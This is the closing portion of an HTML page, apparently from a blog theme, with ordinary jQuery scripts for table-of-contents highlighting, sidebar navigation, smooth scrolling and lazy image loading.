<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.motion.complete', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      var $indicator = $(indicator);
      var opacity = action === 'show' ? 0.4 : 0;
      $indicator.velocity ?
        $indicator.velocity('stop').velocity({
          opacity: opacity
        }, { duration: 100 }) :
        $indicator.stop().animate({
          opacity: opacity
        }, 100);
    }

  });
</script>

<script type="text/javascript" id="sidebar.nav">
  $(document).ready(function () {
    var html = $('html');
    var TAB_ANIMATE_DURATION = 200;
    var hasVelocity = $.isFunction(html.velocity);

    $('.sidebar-nav li').on('click', function () {
      var item = $(this);
      var activeTabClassName = 'sidebar-nav-active';
      var activePanelClassName = 'sidebar-panel-active';
      if (item.hasClass(activeTabClassName)) {
        return;
      }

      var currentTarget = $('.' + activePanelClassName);
      var target = $('.' + item.data('target'));

      hasVelocity ?
        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
            .addClass(activePanelClassName);
        }) :
        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
          currentTarget.hide();
          target
            .stop()
            .css({'opacity': 0, 'display': 'block'})
            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
              currentTarget.removeClass(activePanelClassName);
              target.addClass(activePanelClassName);
            });
        });

      item.siblings().removeClass(activeTabClassName);
      item.addClass(activeTabClassName);
    });

    $('.post-toc a').on('click', function (e) {
      e.preventDefault();
      var targetSelector = escapeSelector(this.getAttribute('href'));
      var offset = $(targetSelector).offset().top;
      hasVelocity ?
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        }) :
        $('html, body').stop().animate({
          scrollTop: offset
        }, 500);
    });

    // Expand sidebar on post detail page by default, when post has a toc.
    var $tocContent = $('.post-toc-content');
    if (isDesktop() && CONFIG.sidebar === 'post') {
      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
        displaySidebar();
      }
    }
  });
</script>



  <script type="text/javascript">
    $(document).ready(function () {
      if (CONFIG.sidebar === 'always') {
        displaySidebar();
      }
      if (isMobile()) {
        FastClick.attach(document.body);
      }

      motionIntegrator.bootstrap();
    });
  </script>

  
  

  
  

  
  <script type="text/javascript" src="/js/lazyload.js"></script>
  <script type="text/javascript">
    $(function () {
      $("#posts").find('img').lazyload({
        placeholder: "/images/loading.gif",
        effect: "fadeIn"
      });
    });
  </script>
</body>
</html>
